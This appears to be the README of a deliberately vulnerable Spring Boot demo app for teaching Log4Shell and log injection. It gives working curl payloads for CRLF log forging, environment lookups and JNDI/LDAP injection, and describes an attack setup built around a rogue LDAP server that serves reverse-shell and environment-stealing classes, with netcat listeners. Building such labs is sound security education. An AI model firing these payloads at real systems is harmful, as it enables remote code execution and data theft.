# Log Injection with Spring Boot and Log4J2

## Description

Exemple d'application java vulnérable à l'attaque [Log4Shell](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/).

Le repo contient :
- Une application Java **DemoApplication** vulnérable (plus particulièrement la classe *HelloController.java*)
- Des fichiers (`evil/ldap/`) permettant d'attaquer l'application *DemoApplication* :
  - **marshalsec\*.jar** : permet de simuler un serveur LDAP qui sera utilisé pour injecter le code malveillant dans l'application
  - plusieurs classes de code malveillant (à compiler), permettant chacune une attaque différente :
    - **OpenKeyPassExploit.java** : attaque permettant de lancer l'application OpenKeyPass (il faut donc qu'elle soit installée sur le poste)
    - **ReverseShellExploit.java** : attaque permettant de lancer un _reverse shell_
    - **StealEnvUserNameExploit.java** : attaque permettant de récupérer les variables d'environnement de l'utilisateur
  - **server.py** : serveur python multi-threads permettant de lancer un serveur LDAP (Marshalsec) ainsi qu'un serveur web (pour héberger les classes malveillantes : _OpenKeyPassExploit_, _ReverseShellExploit_ ou _StealEnvUserNameExploit_)
- Un serveur python **receiver/server.py** permettant de **recevoir** les informations sur le port **8001** (par exemple pour l'attaque _StealEnvUserNameExploit_), mais peut être remplacé par une commande _netcat_.

## Usage

Testé avec Java 17.

- Run

```shell
./gradlew bootRun
```

- Request

```shell
curl http://localhost:8080/\?name\=Frodon
```

## Hack

### Using CRLF injection

```shell
curl http://localhost:8080/\?name\=Marty%0d%0a2023-09-08%2010%3A40%3A01.108%20DEBUG%202175773%20---%20%5Bnio-8080-exec-1%5D%20n.e.d.HelloController%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3A%20You%20have%20been%20pwed%0A
```

### Using date lookup

Date lookup ``${date:yyyyMMdd-HHmmss}``:

```shell
curl http://localhost:8080/\?name\=%24%7Bdate%3AyyyyMMdd-HHmmss%7D
```

### Using env lookup

Env lookup ``${env:USER}``:

```shell
curl http://localhost:8080/\?name\=%24%7Benv%3AUSER%7D
```

### Using JNDI Injection + LDAP (OpenKeyPassExploit)

- Run the evil ldap server

```shell
javac evil/ldap/OpenKeyPassExploit.java
python evil/ldap/server.py OpenKeyPassExploit
```

- JNDI LDAP lookup

```shell
curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
```

### Using JNDI Injection + LDAP (StealEnvUserNameExploit)

- Run the evil ldap & receiver server

```shell
javac evil/ldap/StealEnvUserNameExploit.java
python evil/ldap/server.py StealEnvUserNameExploit
python evil/receiver/server.py # ou : nc -lv 8001
```

- JNDI LDAP lookup

```shell
curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
```

### Using JNDI Injection + LDAP (ReverseShellExploit)

- Run the evil ldap

```shell
javac evil/ldap/ReverseShellExploit.java
python evil/ldap/server.py ReverseShellExploit
```

- Listening for incoming (evil)

```shell
nc -lv 9001
```

- JNDI LDAP lookup

```shell
curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
```

## Fix

Using output encoding (JSON), log injection are not!

Even if app uses a vulnerable version of log4j2. Check it with OSS Index:

./gradlew ossIndexAudit
